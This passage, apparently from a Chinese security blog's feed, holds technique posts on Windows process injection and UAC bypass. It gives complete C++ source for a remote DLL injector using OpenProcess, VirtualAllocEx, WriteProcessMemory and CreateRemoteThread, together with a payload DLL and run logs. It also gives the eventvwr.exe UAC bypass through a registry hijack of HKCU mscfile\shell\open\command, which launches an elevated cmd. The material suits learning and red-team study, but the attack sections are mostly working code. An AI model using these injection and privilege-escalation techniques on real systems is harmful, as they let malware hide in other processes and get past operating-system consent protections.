class="hljs-string">L&quot;Shellcode Injection Fail \n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><br/><p>运行</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">remote_shellcode_injection.exe <span class="hljs-number">8044</span><br><span class="hljs-comment"># Injecting DLL to PID: 8044</span><br><span class="hljs-comment"># Shellcode Injection Sucess</span><br></code></pre></div></td></tr></table></figure><p><img src="/assets/img/2020_11_12_16_04_code_injection/2020-11-12-PM-4.41.13.png" alt="Sucess"></p><br/><h2 id="Links-amp-Resources"><a href="#Links-amp-Resources" class="headerlink" title="Links &amp; Resources"></a>Links &amp; Resources</h2><ul><li><a href="https://xz.aliyun.com/t/6253">初探代码注入</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>信息安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>code injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Remote DLL Injection Demo</title>
    <link href="/2020/11/11/14_41_remote_dll_injection/"/>
    <url>/2020/11/11/14_41_remote_dll_injection/</url>
    
    <content type="html"><![CDATA[<p>Remote DLL Injection Demo</p><a id="more"></a><p>Function</p><ul><li><code>OpenProcess</code></li><li><code>VirtualAllocEx</code></li><li><code>WriteProcessMemory</code></li><li><code>GetProcAddress</code></li><li><code>GetModuleHandle</code></li><li><code>LoadLibraryW</code></li><li><code>CreateRemoteThread</code></li></ul><br/><p>OpenProcess</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">HANDLE <span class="hljs-title">OpenProcess</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  DWORD dwDesiredAccess,    <span class="hljs-comment">// 想拥有的该进程访问权限</span></span></span><br><span class="hljs-function"><span class="hljs-params">  BOOL  bInheritHandle,     <span class="hljs-comment">// 是否继承句柄</span></span></span><br><span class="hljs-function"><span class="hljs-params">  DWORD dwProcessId         <span class="hljs-comment">// PID</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>VirtualAllocEx</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">LPVOID <span class="hljs-title">VirtualAllocEx</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HANDLE hProcess,          <span class="hljs-comment">// 目标进程句柄</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPVOID lpAddress,         <span class="hljs-comment">// 保留页面的内存地址, 一般用 NULL 自动分配</span></span></span><br><span class="hljs-function"><span class="hljs-params">  SIZE_T dwSize,            <span class="hljs-comment">// 欲分配的内存大小，字节单位</span></span></span><br><span class="hljs-function"><span class="hljs-params">  DWORD  flAllocationType,  <span class="hljs-comment">// 分配内存空间的类型</span></span></span><br><span class="hljs-function"><span class="hljs-params">  DWORD  flProtect          <span class="hljs-comment">// 内存访问权限</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>WriteProcessMemory</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">WriteProcessMemory</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HANDLE  hProcess,                 <span class="hljs-comment">// 目标进程句柄</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPVOID  lpBaseAddress,            <span class="hljs-comment">// 目标进程内存空间起始地址</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPCVOID lpBuffer,                 <span class="hljs-comment">// 要写入数据的内存空间地址</span></span></span><br><span class="hljs-function"><span class="hljs-params">  SIZE_T  nSize,                    <span class="hljs-comment">// 需要要写入的字节大小</span></span></span><br><span class="hljs-function"><span class="hljs-params">  SIZE_T  *lpNumberOfBytesWritten   <span class="hljs-comment">// 实际写入的字节数</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>GetProcAddress</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">FARPROC <span class="hljs-title">GetProcAddress</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HMODULE hModule,      <span class="hljs-comment">// DLL 模块句柄</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPCSTR  lpProcName    <span class="hljs-comment">// 函数名</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>GetModuleHandle</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">HMODULE <span class="hljs-title">GetModuleHandleW</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  LPCWSTR lpModuleName      <span class="hljs-comment">// 模块名</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>LoadLibraryW</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">HMODULE <span class="hljs-title">LoadLibraryW</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  LPCWSTR lpLibFileName     <span class="hljs-comment">// DLL 路径名</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>CreateRemoteThread</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">HANDLE <span class="hljs-title">CreateRemoteThread</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HANDLE                 hProcess,              <span class="hljs-comment">// 进程句柄</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPSECURITY_ATTRIBUTES  lpThreadAttributes,    <span class="hljs-comment">// 安全属性</span></span></span><br><span class="hljs-function"><span class="hljs-params">  SIZE_T                 dwStackSize,           <span class="hljs-comment">// 线程栈初始大小, 以字节为单位, 如果该值设为 0, 那么使用系统默认大小</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPTHREAD_START_ROUTINE lpStartAddress,        <span class="hljs-comment">// 在远程进程的地址空间中, 该线程的线程函数的起始地址</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPVOID                 lpParameter,           <span class="hljs-comment">// 传给线程函数的参数</span></span></span><br><span class="hljs-function"><span class="hljs-params">  DWORD                  dwCreationFlags,       <span class="hljs-comment">// 线程的创建标志</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPDWORD                lpThreadId             <span class="hljs-comment">// 所创建线程 ID 的指针, 如果创建失败, 该参数为 NULL</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></div></td></tr></table></figure><br/><h2 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h2><ul><li>使用 <code>OpenProcess</code> 函数获取对进程的访问权限</li><li>使用 <code>VirtualAllocEx</code> 函数在远程进程空间中分配一块内存</li><li>使用 <code>WriteProcessMemory</code> 函数将 DLL 路径名复制到分配的内存中</li><li>使用 <code>GetProcAddress</code> 函数来得到 <code>LoadLibrary</code> 函数在(<code>kernel32.dll</code>)中的实际地址</li><li>使用 <code>CreateRemoteThread</code> 函数在远程进程中创建一个线程，线程调用 <code>LoadLibrary</code> 函数并在参数中传入第二步分配到的内存(DLL 路径)</li></ul><br/><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>calc.dll</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">InheritParent</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    STARTUPINFO si = &#123; <span class="hljs-keyword">sizeof</span>(si) &#125;;<br>    PROCESS_INFORMATION piReadCmd;<br>    TCHAR szAppName[]   = <span class="hljs-string">L&quot;C:\\Windows\\System32\\calc.exe&quot;</span>;<br>    DWORD dwCreateFlage = CREATE_NEW_CONSOLE;<br><br><br>    BOOL bNewProcess = CreateProcess(szAppName, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, dwCreateFlage, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;piReadCmd);<br>    <span class="hljs-keyword">if</span> (bNewProcess)<br>    &#123;<br>        CloseHandle(piReadCmd.hThread);<br>        CloseHandle(piReadCmd.hProcess);<br>    &#125;<br>&#125;<br><br><span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        InheritParent();<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;DLL_PROCESS_DETACH&quot;</span>, <span class="hljs-string">L&quot;Title&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>RemoteInjectDll.exe</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><br><br><span class="hljs-function">BOOL <span class="hljs-title">RemoteInjectDll</span><span class="hljs-params">(DWORD PID, LPCTSTR dllpath)</span></span><br><span class="hljs-function"></span>&#123;<br>    BOOL status         = FALSE;<br>    HANDLE hProcess     = <span class="hljs-literal">NULL</span>, hThread = <span class="hljs-literal">NULL</span>;<br>    HMODULE hMod        = <span class="hljs-literal">NULL</span>;<br>    PWSTR remote_buffer = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">int</span> len_dllpath     = <span class="hljs-number">1</span> + lstrlen(dllpath);<br>    <span class="hljs-keyword">int</span> dllpath_memory  = len_dllpath * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">wchar_t</span>);<br>    PTHREAD_START_ROUTINE get_func_address = <span class="hljs-literal">NULL</span>;<br><br>    __try<br>    &#123;<br>        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);<br>        _tprintf(<span class="hljs-string">L&quot;Injecting DLL to PID: %lu \n&quot;</span>, PID);<br>        <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            _tprintf(<span class="hljs-string">L&quot;Get Process Handle Error : %lu \n&quot;</span>, GetLastError());<br>            __leave;<br>        &#125;<br><br>        __try<br>        &#123;<br>            remote_buffer = (PWSTR)VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, dllpath_memory, MEM_COMMIT, PAGE_READWRITE);<br>            <span class="hljs-keyword">if</span> (remote_buffer == <span class="hljs-literal">NULL</span>)<br>            &#123;<br>                _tprintf(<span class="hljs-string">L&quot;VirtualAlloc Error %lu \n&quot;</span>, GetLastError());<br>                __leave;<br>            &#125;<br>        &#125;<br>        __finally<br>        &#123;<br>            _tprintf(<span class="hljs-string">L&quot;VirtualAlloc Done\n&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!WriteProcessMemory(hProcess, remote_buffer, (PVOID)dllpath, dllpath_memory, <span class="hljs-literal">NULL</span>)) __leave;<br><br>        hMod = GetModuleHandle(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);<br>        get_func_address = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);<br>        <span class="hljs-keyword">if</span> (get_func_address == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            _tprintf(<span class="hljs-string">L&quot;Get LoadLibrary Address Error %lu \n&quot;</span>, GetLastError());<br>            __leave;<br>        &#125;<br><br>        hThread = CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, get_func_address, remote_buffer, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">if</span> (hThread == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            _tprintf(<span class="hljs-string">L&quot;CreateRemoteThread Error %lu \n&quot;</span>, GetLastError());<br>            __leave;<br>        &#125;<br><br>        WaitForSingleObject(hThread, INFINITE);<br>        status = TRUE;<br>    &#125;<br>    __finally<br>    &#123;<br>        <span class="hljs-keyword">if</span> (remote_buffer != <span class="hljs-literal">NULL</span>)<br>            VirtualFreeEx(hProcess, remote_buffer, <span class="hljs-number">0</span>, MEM_RELEASE);<br>        <span class="hljs-keyword">if</span> (hThread != <span class="hljs-literal">NULL</span>)<br>            CloseHandle(hThread);<br>        <span class="hljs-keyword">if</span> (hProcess != <span class="hljs-literal">NULL</span>)<br>            CloseHandle(hProcess);<br>    &#125;<br>    <span class="hljs-keyword">return</span>(status);<br>&#125;<br><br><span class="hljs-keyword">int</span> _tmain(<span class="hljs-keyword">int</span> argc, TCHAR* argv[], TCHAR* envp[])<br>&#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>)<br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;Usage: %s &lt;pid&gt; &lt;dll path&gt; \n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (RemoteInjectDll((DWORD)_tstol(argv[<span class="hljs-number">1</span>]), argv[<span class="hljs-number">2</span>]))<br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;InjectDll Sucess \n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;InjectDll Fail \n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></div></td></tr></table></figure><br/><p>运行</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">remote_dllInjection.exe <span class="hljs-number">6248</span> C:\Users\<span class="hljs-number">0</span>x20C\Desktop\open_calc.dll<br><span class="hljs-comment"># Injecting DLL to PID: 6248</span><br><span class="hljs-comment"># Stop VirtualAlloc</span><br><span class="hljs-comment"># InjectDll Sucess</span><br></code></pre></div></td></tr></table></figure><p><img src="/assets/img/2020_11_11_14_41_remote_dll_injection/2020-11-12-AM-10.18.23.png" alt="Sucess"></p><br/><h2 id="Links-amp-Resources"><a href="#Links-amp-Resources" class="headerlink" title="Links &amp; Resources"></a>Links &amp; Resources</h2><ul><li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection">DLL Injection</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>信息安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dll hijacking</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bypass UAC Eventvwr</title>
    <link href="/2020/11/09/16_24_bypass_uac_eventvwr/"/>
    <url>/2020/11/09/16_24_bypass_uac_eventvwr/</url>
    
    <content type="html"><![CDATA[<p>Bypass UAC eventvwr.exe</p><a id="more"></a><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">sigcheck.exe <span class="hljs-literal">-m</span> C:\Windows\System32\eventvwr.exe<br></code></pre></div></td></tr></table></figure><p>输出</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span><br><span class="hljs-comment">&lt;!-- Copyright (c) Microsoft Corporation --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">assembly</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v1&quot;</span>  <span class="hljs-attr">xmlns:asmv3</span>=<span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span> <span class="hljs-attr">manifestVersion</span>=<span class="hljs-string">&quot;1.0&quot;</span>&gt;</span><br>&lt;assemblyIdentity<br>    version=&quot;5.1.0.0&quot;<br>    processorArchitecture=&quot;amd64&quot;<br>    name=&quot;Microsoft.Windows.Eventlog.EventVwr&quot;<br>    type=&quot;win32&quot;<br>/&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Event Viewer Snapin Launcher<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">trustInfo</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">security</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">requestedPrivileges</span>&gt;</span><br>            &lt;requestedExecutionLevel<br>                level=&quot;highestAvailable&quot;<br>                uiAccess=&quot;false&quot;<br>            /&gt;<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">requestedPrivileges</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">security</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">trustInfo</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">asmv3:application</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">asmv3:windowsSettings</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/SMI/2005/WindowsSettings&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">autoElevate</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">autoElevate</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">asmv3:windowsSettings</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">asmv3:application</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">assembly</span>&gt;</span><br></code></pre></div></td></tr></table></figure><br/><p>执行权限级别</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">requestedPrivileges</span>&gt;</span><br>    &lt;requestedExecutionLevel<br>        level=&quot;highestAvailable&quot;<br>        uiAccess=&quot;false&quot;<br>    /&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">requestedPrivileges</span>&gt;</span><br></code></pre></div></td></tr></table></figure><ul><li><code>highestAvailable</code>: 此程序将以当前用户能获取的最高权限来运行</li><li><code>requireAdministrator</code>: 应用程序仅为管理员运行，并要求使用管理员的完整访问令牌启动应用程序</li></ul><br/><blockquote><p><code>level=&#39;highestAvailable&#39;</code>: The application runs at the highest permission level that it can. If the user who starts the application is a member of the Administrators group, this option is the same as level=’requireAdministrator’. If the highest available permission level is higher than the level of the opening process, the system prompts for credentials.</p></blockquote><blockquote><p><code>uiAccess=&#39;true&#39;</code> if you want the application to bypass user interface protection levels and drive input to higher-permission windows on the desktop; otherwise, uiAccess=’false’. Defaults to uiAccess=’false’. Set this argument to uiAccess=’true’ only for user interface accessibility applications.</p></blockquote><br/><p><code>autoelevate</code> 标志被设置为 true，允许可执行文件自动提升到高完整性，而不提示管理员用户是否同意</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">autoElevate</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">autoElevate</span>&gt;</span><br></code></pre></div></td></tr></table></figure><br/><hr><p>Process Monitor Filter:</p><ul><li>Process Name is eventvwr.exe</li><li>Operation contains Reg</li><li>Result is NAME NOT FOUND</li></ul><p>有如下条目</p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">HKCU<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\C</span>lasses<span class="hljs-symbol">\m</span>scfile<span class="hljs-symbol">\s</span>hell<span class="hljs-symbol">\o</span>pen<span class="hljs-symbol">\c</span>ommand    NAME NOT FOUND<br>HKCR<span class="hljs-symbol">\m</span>scfile<span class="hljs-symbol">\s</span>hell<span class="hljs-symbol">\o</span>pen<span class="hljs-symbol">\c</span>ommand<span class="hljs-symbol">\D</span>elegateExecute     NAME NOT FOUND<br></code></pre></div></td></tr></table></figure><p>检查 <code>HKCR\mscfile\shell\open\command\(default)</code> 值</p><figure class="highlight gcode"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gcode"><span class="hljs-meta">%</span>SystemRoot<span class="hljs-meta">%</span>\syste<span class="hljs-name">m32</span>\mmc.exe <span class="hljs-string">&quot;%1&quot;</span> <span class="hljs-meta">%</span>*<br></code></pre></div></td></tr></table></figure><br/><p>创建丢失项并添加值(若是不添加值: Cannot start Event Viewer)</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">REG ADD HKCU\Software\Classes\mscfile\shell\open\command<br><br>REG ADD HKCU\Software\Classes\mscfile\shell\open\command /d <span class="hljs-string">&quot;cmd /c start C:\Windows\System32\cmd.exe&quot;</span> /f<br></code></pre></div></td></tr></table></figure><br/><p>若是直接使用 <code>C:\Windows\System32\cmd.exe</code> 作为值，并不会打开一个 cmd 窗口，cmd 进入后台</p><p><img src="/assets/img/2020_11_09_16_24_bypass_uac_eventvwr/2020-11-09-PM-8.47.07.png" alt="show"></p><br/><p>Process Monitor Filter:</p><ul><li>PATH contains mscfile\shell\open\command</li><li>delete Result is NAME NOT FOUND</li></ul><br/><p>重新运行 eventvwr</p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">HKCU<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\C</span>lasses<span class="hljs-symbol">\m</span>scfile<span class="hljs-symbol">\s</span>hell<span class="hljs-symbol">\o</span>pen<span class="hljs-symbol">\c</span>ommand    SUCCESS<br></code></pre></div></td></tr></table></figure><br/><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">Start-Process</span> <span class="hljs-literal">-FilePath</span> C:\Windows\System32\eventvwr.exe<br></code></pre></div></td></tr></table></figure><p><img src="/assets/img/2020_11_09_16_24_bypass_uac_eventvwr/2020-11-09-PM-8.52.13.png" 